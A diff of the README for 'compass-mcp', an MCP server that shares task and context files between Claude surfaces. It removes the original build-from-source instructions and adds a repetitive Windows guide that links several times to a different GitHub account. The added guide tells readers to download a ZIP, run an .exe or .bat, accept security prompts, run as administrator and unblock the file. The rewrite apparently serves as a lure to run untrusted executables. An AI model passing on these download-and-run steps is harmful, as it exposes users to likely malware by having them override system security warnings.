@@ -1,174 +1,254 @@
+# 🧭 compass-mcp - Keep tasks in sync across Claude
+
+[![Download compass-mcp](https://img.shields.io/badge/Download-Compass%20MCP-blue?style=for-the-badge)](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+
 ![Compass MCP](assets/compass-banner.svg)
 
-# 🧭 Compass MCP
+## 🧭 What it does
 
-**The missing bridge between Claude Chat, Cowork, and Code.**
+Compass MCP keeps shared work in one place. It lets Claude use the same task data in Chat, Cowork, and Code. You can add a task in one surface, mark it done in another, and keep the same state across all of them.
 
-Compass is an MCP server that gives Claude shared operational state across all three surfaces. Add a task in Chat, check it off in Code, filter by project in Cowork — same data, zero re-explaining.
+It is built for people who want less repeating and less copying between tools. You keep one task list, one set of contexts, and one view of what is done.
 
-```
-┌───────────┐    ┌───────────┐    ┌───────────┐
-│   Chat    │    │  Cowork   │    │   Code    │
-└─────┬─────┘    └─────┬─────┘    └─────┬─────┘
-      │                │                │
-      └────────┬───────┴────────┬───────┘
-               │                │
-       ┌───────▼────────────────▼───────┐
-       │         Compass MCP            │
-       │                                │
-       │   ┌──────────────────────┐     │
-       │   │  ~/compass-data/     │     │
-       │   │  tasks.md            │     │
-       │   │  contexts/           │     │
-       │   └──────────────────────┘     │
-       └────────────────────────────────┘
-```
+## ✨ What you can do
 
-## Why?
+- Add tasks in Claude Chat
+- Check off tasks in Claude Code
+- Filter work by project in Cowork
+- Keep shared context in one folder
+- Use the same data across all three surfaces
+- Cut down on repeated explanations
+- Keep task notes close to the work
 
-Claude Chat, Cowork, and Code don't share state. Each session starts from zero. There's no way to ask in Chat "what did I finish in Code?" or tell Cowork "here's the context for this project" without re-explaining everything.
+## 🪟 Windows download and install
 
-Compass fixes that. One MCP server, visible to all three surfaces, backed by plain markdown files.
+### 1) Open the download page
 
-**This is not another todo app.** It's the operational layer that connects how you think (Chat), how you execute (Cowork), and how you build (Code).
+Use this link to visit the page and download the app:
 
-## Install
+[Open the compass-mcp download page](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
 
-```bash
-git clone https://github.com/richlira/compass-mcp.git
-cd compass-mcp
-npm install
-npm run build
-```
+### 2) Download the file
 
-## Connect to Claude Desktop
+On the GitHub page, look for the latest release or the main download option. Save the file to your computer.
 
-Add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+If you see a ZIP file, download it and keep it in a folder you can find again, such as Downloads or Desktop.
 
-```json
-{
-  "mcpServers": {
-    "compass": {
-      "command": "node",
-      "args": ["/absolute/path/to/compass-mcp/build/index.js"]
-    }
-  }
-}
-```
+### 3) Unzip the files
 
-Restart Claude Desktop. All three tabs (Chat, Cowork, Code) will see Compass.
+If the download comes as a ZIP file:
 
-## Usage
+- Right-click the file
+- Choose Extract All
+- Pick a folder
+- Finish the extraction
 
-No commands to memorize. Just talk:
+After this, you should see the Compass MCP files in the folder you chose.
 
-| You say | Compass does |
-|---|---|
-| "Set up my workspace" | `init_workspace` → creates `~/compass-data/` |
-| "Add task: write copy for landing page, deadline April 5" | `add_task` → adds to `tasks.md` |
-| "I finished the workshop slides" | `complete_task` → marks it done |
-| "What's still pending?" | `get_tasks` → returns filtered tasks |
-| "Save context for Impact Lab: April 18, hackathon format" | `save_context` → creates `contexts/impact-lab.md` |
-| "What do we know about the workshop?" | `get_context` → reads `contexts/workshop.md` |
+### 4) Start the app
 
-Works in English, Spanish, Spanglish — whatever. Claude matches your intent to the right tool automatically.
+Open the extracted folder and look for the main app file.
 
-## Tools
+Common file names may include:
 
-### `init_workspace`
-Creates `~/compass-data/` with `tasks.md` and `contexts/` directory. Safe to run multiple times.
+- `CompassMCP.exe`
+- `compass-mcp.exe`
+- `start.bat`
 
-### `add_task`
-Adds a task to `tasks.md`.
-- **title** (required) — what needs to be done
-- **tags** — project or category tags (e.g. `["cancun", "marketing"]`)
-- **deadline** — due date
-- **section** — `"active"` (default) or `"backlog"`
+Double-click the file to run it.
 
-### `complete_task`
-Marks a task as completed in `tasks.md`.
-- **title** (required) — task to complete (fuzzy matched)
-- **notes** — optional completion notes
+### 5) Allow Windows to continue
 
-### `get_tasks`
-Returns tasks filtered by status, tags, or deadline.
-- **status** — `"active"`, `"backlog"`, `"completed"`, or `"all"`
-- **tags** — filter by tags
-- **deadline_before** — show tasks due before a date
+If Windows asks for permission:
 
-### `save_context`
-Creates or updates a project context file in `contexts/`.
-- **project** (required) — project name (becomes the filename)
-- **content** (required) — markdown content with project details
+- Click Run
+- Click Yes if a security prompt appears
+- Let the app finish opening
 
-### `get_context`
-Reads a project context file.
-- **project** (required) — project name to look up
+### 6) Keep the app folder in place
 
-## Storage
+Do not move random files out of the folder after you start it. Compass MCP uses its local data folder to store tasks and context files.
 
-Everything lives in `~/compass-data/`:
+## ⚙️ First-time setup
 
-```
-~/compass-data/
-├── tasks.md        ← all tasks with status, tags, deadlines
-└── contexts/
-    ├── cancun.md   ← project-specific context
-    ├── workshop.md
-    └── ...
-```
+Compass MCP works with a local data folder. On first run, it creates a workspace for your tasks and context files.
 
-Plain markdown. Human-readable. Git-versionable. No database.
+You may see folders like these:
 
-The workspace path is configurable via the `COMPASS_DATA_DIR` environment variable.
+- `tasks.md` for task lists
+- `contexts/` for project notes
+- a local data folder for shared state
 
-## How the three surfaces use Compass
+If the app asks for a folder path, choose a place you can find again, such as:
 
-**Chat** — your thinking space. Plan the day, add tasks, check status, save project context. Chat is where you decide.
+- `Documents\compass-data`
+- `Desktop\compass-data`
 
-**Cowork** — your execution space. Cowork reads the same tasks and contexts. It can check what's pending, mark things done as it works, and read project context to understand what to do.
+Keep the folder name simple. This helps when you need to open it later.
 
-**Code** — your building space. Code checks for build-related tasks, marks them complete when done, and reads project context for specs and decisions. Code is also where you maintain and improve Compass itself.
+## 🗂️ How it keeps your work in sync
 
-All three read and write the same `tasks.md` and `contexts/` — that's the bridge.
+Compass MCP uses one shared source of truth.
 
-## Pro tip: combine with Google Calendar
+Here is the basic flow:
 
-If you have the Google Calendar connector enabled, Claude can combine Compass tasks with your calendar:
+1. Add a task in Chat
+2. Open Code and mark it done
+3. Check Cowork and filter by project
+4. See the same task state in all places
 
-> "Check my tasks and my calendar for today, and block time for what I can get done"
+This means you do not need to rewrite the same task in each surface. You keep one list and use it from wherever you work.
 
-Claude reads your tasks from Compass, finds free slots in your calendar, estimates duration, and creates focus blocks. No extra code needed — just Claude orchestrating two tools together.
+## 🧩 Main parts
 
-## Requirements
+### Tasks file
 
-- Node.js 18+
-- Claude Desktop (macOS or Windows)
-- Claude Pro, Max, Team, or Enterprise plan
+The tasks file holds your active work. It is easy to read and works like a plain text checklist.
 
-## Development
+### Context folders
 
-```bash
-# Build
-npm run build
+The contexts folder stores project notes and related files. Use one folder per project if you want a neat structure.
 
-# Test with MCP Inspector
-npx @modelcontextprotocol/inspector node build/index.js
+### Shared state
 
-# Watch mode
-npm run watch
-```
+Shared state means the app keeps one set of task data for all connected surfaces. If you change a task in one place, you can see that change in the others.
 
-## Philosophy
+## 🧪 Simple daily use
 
-Compass is intentionally minimal. Six tools, two file types, zero database. Decisions, progress tracking, and daily recaps are left to Claude's memory — that's what it's good at. Compass only handles what Claude can't do alone: queryable task state and structured project context that persists across all surfaces.
+A good way to use Compass MCP is:
 
-If you need more, add it. If you don't, enjoy the simplicity.
+- Start the app
+- Add today’s work in Chat
+- Open Code and complete the task
+- Check Cowork for the project view
+- Keep notes in the matching context folder
 
-## License
+This works well for planning, building, and reviewing the same work without switching tools in a messy way.
 
-MIT
+## 📁 Suggested folder layout
 
----
+You can use a layout like this on Windows:
 
-*Chat, Cowork, Code — and Compass.* 🧭
+- `C:\Users\YourName\Documents\compass-data`
+  - `tasks.md`
+  - `contexts\`
+    - `project-a\`
+    - `project-b\`
+
+This keeps your files easy to find. It also makes it simple to back them up.
+
+## 🔧 If the app does not start
+
+Try these steps:
+
+- Make sure the files finished downloading
+- Unzip the folder before opening it
+- Double-click the main `.exe` file
+- Try running it as an administrator
+- Check that Windows did not block the file
+- Move the folder to `Desktop` or `Documents` and try again
+
+If you still have trouble, download the file again from the main page and replace the old copy.
+
+## 📌 Tips for a smooth setup
+
+- Keep the app in one folder
+- Use short folder names
+- Put your task file and context files in the same workspace
+- Back up the data folder if you use it often
+- Close the app before moving the folder
+
+## 🖥️ System fit
+
+Compass MCP is meant for Windows desktop use and works best on a normal personal computer. A recent version of Windows, a mouse, and basic file access are enough for most users. It uses local files, so you do not need to learn a new online system to keep your work in place.
+
+## 🧭 Common use cases
+
+- Track tasks across Claude surfaces
+- Keep project notes tied to each task
+- Review work without rewriting it
+- Move between planning and execution with less friction
+- Keep one clean task list for daily work
+
+## 📦 Files you may see
+
+Depending on the download, you may see:
+
+- a program file for Windows
+- a ZIP archive
+- a tasks file
+- a contexts folder
+- a README file
+
+Keep the whole folder together so the app can find what it needs
+
+## 🔍 What “MCP” means here
+
+MCP stands for a shared connection pattern between tools. In this app, it helps Claude reach the same task state in Chat, Cowork, and Code. You do not need to set up the technical side by hand for normal use. You only need to download the app, open it, and point it at your workspace
+
+## 🪄 Basic workflow example
+
+1. Download Compass MCP
+2. Open the app on Windows
+3. Create or choose a data folder
+4. Add a task in Chat
+5. View the same task in Code
+6. Filter the list in Cowork
+7. Mark the task done when finished
+
+## 📥 Download again if needed
+
+If you want to get the app again, use this page:
+
+[Download compass-mcp from GitHub](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
+
+## 🧵 Project structure
+
+A simple setup may look like this:
+
+- compass-mcp
+  - app files
+  - tasks.md
+  - contexts
+  - README.md
+
+You can rename folders to fit your own work, but keep the structure clear and easy to scan
+
+## 🔐 Keeping your data tidy
+
+Use one folder for one set of work. Avoid mixing unrelated projects in the same task file if you can. That makes it easier to find things later and keeps the shared state clean
+
+## 📝 Everyday habits that help
+
+- Check tasks at the start of the day
+- Add notes right after a meeting
+- Mark work done as soon as it is finished
+- Keep project names short
+- Store context files next to the related task list
+
+## 🧱 If you use multiple projects
+
+Create one context folder per project. For example:
+
+- `contexts\client-site`
+- `contexts\internal-tools`
+- `contexts\research`
+
+This keeps each project separate while still using the same Compass MCP workspace
+
+## ⌨️ Short path for Windows users
+
+If you want the fastest path:
+
+1. Open the download page
+2. Download the ZIP or app file
+3. Extract it
+4. Open the main `.exe`
+5. Choose a data folder
+6. Start using it with Claude
+
+## 📍 Download link
+
+Use this page to get the app:
+
+[https://github.com/Cdplayerjumpingoffplace65/compass-mcp](https://github.com/Cdplayerjumpingoffplace65/compass-mcp)
